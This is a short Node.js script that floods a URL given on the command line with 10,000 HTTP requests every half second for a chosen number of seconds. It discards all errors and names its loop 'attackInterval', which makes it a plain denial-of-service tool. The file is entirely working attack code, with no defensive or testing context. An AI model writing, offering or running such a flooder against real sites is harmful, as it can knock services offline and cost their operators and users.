const target = process.argv[2];
const duration = process.argv[3];
const requestsPerInterval = 10000;
const totalRequests = 1000000;

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('Invalid Usage: node index.js <link target> <duration in seconds>');
    process.exit(1);
} else {
    const attackInterval = setInterval(() => {
        for (let i = 0; i < requestsPerInterval; i++) {
            fetch(target).catch(error => {});
        }
    }, 500);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Request sending stopped.');
        process.exit(0);
    }, duration * 1000);
}
